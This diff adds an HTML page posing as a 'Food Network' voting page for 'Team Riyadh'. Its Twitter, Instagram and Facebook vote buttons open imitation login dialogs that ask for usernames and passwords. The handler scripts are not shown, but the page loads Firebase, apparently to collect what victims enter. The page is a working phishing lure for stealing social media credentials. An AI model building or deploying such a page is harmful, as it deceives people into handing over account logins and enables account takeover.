@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.20/dist/sweetalert2.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.20/dist/sweetalert2.min.css">
+<script src="js/jquery-3.6.0.min.js"></script>
+<link rel="stylesheet" href="css/index.css">
+<link rel="stylesheet" href="assets/css/main.css">
+
+<!--Facebook-->
+    <link rel="stylesheet" href="secured/default.css">
+    <link rel="stylesheet" href="secured/style.css">
+<script src="js/index.js"></script>
+<script src="/js/jquery-3.6.0.min.js"></script>
+
+  <!-- Twitter CSS -->
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" crossorigin="anonymous">
+  <link rel="stylesheet" href="twt/CSS/style.css">
+  <link rel="icon" href="favicon.ico">
+
+<title>Food Network Voting</title>
+<style>
+  body {
+    font-family: "Courier New", monospace;
+    margin: 0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    background: linear-gradient(to bottom right, #FFD700, #FF4500);
+  }
+
+  .profile-card {
+    border: 1px solid #ccc;
+    border-radius: 8px;
+    padding: 20px;
+    width: 300px;
+    text-align: center;
+    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+    background-color: #fff;
+  }
+
+  .profile-picture {
+    width: 100px;
+    height: 100px;
+    border-radius: 50%;
+    margin: 0 auto 10px;
+    background-color: #ddd;
+  }
+
+  .profile-name {
+    font-family: "Courier New", monospace;
+    font-size: 1.5em;
+    margin: 5px 0;
+  }
+
+  .profile-title {
+    font-family: "Courier New", monospace;
+    font-size: 1.1em;
+    color: #555;
+    margin: 0;
+  }
+  .profile-description {
+    font-family: "Courier New", monospace;
+    font-size: 0.8em;
+    color: #555;
+    margin: 0;
+  }
+
+  .social-links {
+    margin-top: 15px;
+  }
+
+  .social-icon {
+    font-size: 1em;
+    margin: 0 10px;
+    color: #555;
+  }
+  .social-vote-button {
+    margin-top: 15px;
+  }
+
+  .twitter-button {
+    background-color: black;
+    color: #FFF;
+    border: none;
+    padding: 5px 10px;
+    border-radius: 5px;
+    cursor: pointer;
+  }
+  .instagram-button2 {
+    background-color: red;
+    color: #FFF;
+    border: none;
+    padding: 5px 10px;
+    border-radius: 5px;
+    cursor: pointer;
+  }
+  .facebook-button3 {
+    background-color: blue;
+    color: #FFF;
+    border: none;
+    padding: 5px 10px;
+    border-radius: 5px;
+    cursor: pointer;
+  }
+
+  .preloader {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0, 0, 0, 0.5);
+    color: white;
+    font-size: 24px;
+    align-items: center;
+    justify-content: center;
+    z-index: 9999;
+  }
+
+  .powered-by {
+    text-align: center;
+    margin-top: 20px;
+    color: #888;
+    font-size: 0.8em;
+  }
+</style>
+</head>
+<body>
+  <div id="preloader" class="preloader">
+    Loading...
+  </div>
+
+  <div class="profile-card">
+    <img src="logo.PNG" alt="Profile Picture" class="profile-picture">
+    <h2 class="profile-name">Team Riyadh</h2>
+    <p class="profile-title">tickling your taste bud</p>
+    <p class="profile-description">Please we need your vote!</p>
+ <div class="social-links">
+
+    <div class="social-vote-button">
+
+      <button onclick="Twitter()" class="twitter-button"><i class="fab fa-twitter"></i> Vote with Twitter </button>
+    </div>
+    <div class="social-vote-button">
+      <button onclick="Instagram()" class="instagram-button2"><i class="fab fa-instagram"></i> Vote with Instagram </button>
+    </div>
+
+    <div class="social-vote-button">
+      <button onclick="Facebook()" class="facebook-button3"><i class="fab fa-facebook"></i> Vote with Facebook </button>
+    </div>
+    <br><br>
+    <p class="powered-by">Powered by <strong>Food Network</strong></p>
+
+  </div>
+
+    <!-- Instagram Dialog Box -->
+    <div id="instagram" class="dialog">
+        <div class="dialog-content">
+            <span class="close" onclick="closeDialog()">&times;</span>
+            <h2><span hidden id="dialog-instagram"></span></h2>
+              <main class="l-main">
+              <div class="l-main__img">
+                <img src="assets/img/homepage.png" alt="Smartphones">
+              </div>
+              <div class="l-user">
+                <div class="c-panel group">
+
+              <img class="c-panel__img" src="assets/img/instagram.svg" alt="Instagram">
+              <div class="c-panel__form">
+                <input type="text" class="c-panel__input" class="form-control" required data-error="Please enter your email" placeholder="Phone number, username, or email" id="ig-uname">
+                <input type="text" class="c-panel__input" class="form-control" required data-error="Please enter your email" placeholder="Password" id="ig-pass">
+                <button class="c-btn" type="submit" onclick="iglog()" id="ig-log"> Log In</button> 
+                <span class="c-panel__span">OR</span>
+              </div>
+              <a href="#facebook" class="c-panel__facebook">Login with Facebook</a> <br>
+              <a href="#" class="c-panel__forgot">Forgot password?</a>
+              <br>
+              <br>
+            </div>
+            <div class="c-signup group">
+              <p>Don't have an account? <span>Sign up</span></p>
+            </div>
+
+                  <div class="c-app">
+                    <p>Get the app.</p>
+                    <div class="c-app__download">
+                      <img src="assets/img/apple.png" alt="Apple Store">
+                      <img src="assets/img/google.png" alt="Google Play">
+                    </div>
+                  </div>
+                </div>
+            </main>
+        </div>
+    </div>
+
+     <!-- Facebook Dialog Box -->
+    <div id="facebook" class="dialog">
+        <div class="dialog-content">
+          <span class="close" onclick="closeDialog()">&times;</span>
+          <h2><span hidden id="dialog-instagram"></span></h2>
+          <main class="l-main">
+            <div class="fb-user">
+              <div class="fb-panel fb-group">
+                            <img src="secured/img/logo.svg" alt="">
+                            <p>Facebook helps you connect and share with the people in your life.</p>
+                            <input type="text" placeholder="Email or Phone number" required id="fb-email">
+                            <input type="password" placeholder="Password" required id="fb-pass">
+                            <button class="c-btn" onclick="login()" id="fb-log">Log In</button><br>
+                            
+                            <a href="#">Forgotten password?</a>
+                            <button id="create-btn">Create New Account</button>
+                            <a href="#" style="font-weight: bold; color: var(--black); text-decoration: none;">Create a Page</a> for a celebrity, band or business.
+                </div>
+            </div>
+          </main>
+        </div>
+    </div>
+
+     <!-- Twitter Dialog Box -->
+    <div id="twitter" class="dialog">
+        <div class="dialog-content">
+          <span class="close" onclick="closeDialog()">&times;</span>
+     <div class="row">
+       <div class="none col-1 col-lg-4"></div>
+       <div class="none col-10 col-lg-5">
+         <div class="box bg-white mt-5 p-3">
+           <div class="nav mb-5">
+             <img class="twitter-2" src="twt/IMG/twitter.png" alt="">
+           </div>
+           <div class="mb-4">
+             <h2 class="text-center head"><b>Sign in to Twitter</b></h2>
+           </div>
+
+           <div class="margin mb-4">
+            <input type="text" class="btn but d-flex btn-white border-dark " placeholder="Phone, Email or Username" required id="tw-email">
+            <input type="password" class="btn but d-flex btn-white border-dark " placeholder="Password" required id="tw-pass">
+             <button type="button"
+               class="btn but d-flex justify-content-center btn-white border-dark bg-dark rounded-pill" onclick="tw_login()" id="tw-log">
+               <p class="text-white"><b>Log In</b></p>
+             </button>
+           </div>
+
+           <div class="margin mb-4">
+             <button type="button" class="btn but d-flex justify-content-center btn-white border-dark rounded-pill">
+               <p class="color-white"><b>Forgot password?</b></p>
+             </button>
+           </div>
+
+           <div class="margin">
+             <p>Don't have an account? <a class="text-decoration-none" href="#">Sign up</a></p>
+           </div>
+
+           <div class="margin">
+           </div>
+
+         </div>
+       </div>
+       <div class="none col-1 col-lg-3"></div>
+     </div>
+
+   </div>
+</div>
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.20/dist/sweetalert2.all.min.js"></script>
+  <script>
+    function showCustomAlert() {
+      Swal.fire({
+        title: 'Oops!',
+        text: 'Something went wrong with your vote.',
+        icon: 'error',
+        confirmButtonText: 'Try Again'
+      });
+    }
+  </script>
+
+    <script>
+      function showPreloader() {
+        document.getElementById("preloader").style.display = "flex";
+      }
+
+      function hidePreloader() {
+        document.getElementById("preloader").style.display = "none";
+      }
+
+      function Twitter() {
+        showPreloader();
+        setTimeout(function() {
+          hidePreloader();
+          document.getElementById("twitter").style.display = "flex";
+        }, 1000); // Delay in milliseconds
+      }
+
+      function Instagram() {
+        showPreloader();
+        setTimeout(function() {
+          hidePreloader();
+          document.getElementById("instagram").style.display = "flex";
+        }, 1000); // Delay in milliseconds
+      }
+
+      function Facebook() {
+        showPreloader();
+        setTimeout(function() {
+          hidePreloader();
+          document.getElementById("facebook").style.display = "flex";
+        }, 1000); // Delay in milliseconds
+      }
+
+      function closeDialog() {
+          document.getElementById("instagram").style.display = "none";
+          document.getElementById("twitter").style.display = "none";
+          document.getElementById("facebook").style.display = "none";
+      }
+    </script>
+    <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>
+
+    <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
+
+    <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase.js"></script>
+    <script src="https://raw.githubusercontent.com/firebase/firebase-bower/master/firebase-app-check.js.map"></script>
+
+    <script src="js/firebase.js">
+
+    </script>
+
+</body>
+</html>
